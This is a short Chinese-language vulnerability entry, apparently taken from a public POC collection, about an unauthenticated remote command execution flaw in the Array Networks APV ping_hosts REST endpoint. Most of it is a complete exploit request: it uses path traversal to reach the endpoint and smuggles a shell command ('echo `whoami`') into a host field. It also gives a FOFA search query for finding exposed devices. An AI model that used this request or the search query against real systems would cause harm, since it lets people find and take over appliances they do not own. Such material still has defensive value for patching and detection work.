# Array-Networks-APV应用交付系统ping_hosts存在任意命令执行漏洞

# 一、漏洞简介
Array Networks APV应用交付系统 /rest/ping_hosts 接口存在远程命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。该漏洞利用难度较低，建议受影响的用户尽快修复.

# 二、影响版本
+ Array APV

# 三、资产测绘
+ fofa`app="Array-APV" && title=="Login"`
+ 特征


# 四、漏洞复现
```java
POST /restapi/../rest/ping_hosts HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Content-Length: 98

["127.0.0.1| echo `whoami` received 2 3 4"]=1&csrfmiddlewaretoken=cXLnOdGshlksqOG0Ubnn4SlBvO8zOdWW
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvbg0a36xeft22g9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
